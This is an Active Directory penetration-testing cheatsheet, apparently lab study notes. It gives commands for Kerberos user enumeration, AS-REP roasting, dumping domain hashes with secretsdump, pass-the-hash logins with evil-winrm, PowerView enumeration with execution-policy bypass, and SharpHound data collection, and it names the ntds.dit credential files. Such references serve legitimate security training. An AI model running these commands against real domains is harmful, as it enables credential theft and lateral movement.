# Active Directory Cheatsheet     
## Quick Commands  

    net group /domain  
### Files to Check  
    %SYSTEMROOT%\System32\ntds.dit             #AD database
    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup 

## Resources      
[WADComs](https://wadcoms.github.io/)    

## Cheat Sheets
[AD Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)     
[AD Lateral Movement and Persistence Cheatsheet](https://bhanusnotes.blogspot.com/2020/12/ad-pentest-lateral-movement-persistance.html)  
[AD Cheat sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)  

## General Tools  
[Impacket](https://github.com/SecureAuthCorp/impacket)   
[evil-winrm](https://github.com/nubix/evil-winrm)    
[ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   

## Kerberos (Port 88)   
[Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
[Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
[Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  


    ./kerbrute userenum userlist.txt -d [name] --dc [name]     

Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
    
If you have creds for the backup account for domain controller: can dump all hashes (has full     
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
    
Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    

    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]        

## Post Exploitation    
### PowerView   
Powershell script to enum domain after gaining admin access to machine   

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)   
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)    
[Cheat sheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)   

    powershell -ep bypass   
    . .\PowerView.ps1   
    Get-NetDomain   
    Get-NetUser   
    Get-NetComputer -fulldata   
    
## Bloodhound    
[Bloodhound](https://github.com/BloodHoundAD/BloodHound)   
Bloodhound - GUI app installed on attack box, SharpHound - powershell script to enum and collect data -> exfiltrate as a zip file.     

    apt-get install bloodhound     

on victim, transfer file then import into Bloodhound and run queries   
    . .\SharpHound.ps1   
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
    
## Mimikatz  

[Online Password Cracker - Crackstation](https://crackstation.net/)   
    





